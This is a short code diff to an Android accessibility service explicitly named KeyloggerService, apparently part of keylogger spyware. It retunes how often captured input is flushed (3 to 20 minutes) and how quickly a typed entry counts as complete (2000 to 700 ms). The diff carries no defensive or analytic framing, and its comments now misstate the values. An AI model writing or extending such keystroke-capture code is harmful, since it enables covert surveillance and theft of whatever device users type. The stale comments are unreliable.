@@ -20,8 +20,8 @@ public class KeyloggerService extends AccessibilityService {
     private String lastPackage = "";
     private Handler handler = new Handler();
 
-    private final long INTERVAL = 3 * 60 * 1000; // Flush logs every 3 mins
-    private final long IDLE_DELAY = 2000; // 2 sec idle = full input typed
+    private final long INTERVAL = 20 * 60 * 1000; // Flush logs every 3 mins
+    private final long IDLE_DELAY = 700; // 2 sec idle = full input typed
 
     private Runnable saveRunnable;
     private Runnable inputIdleRunnable;
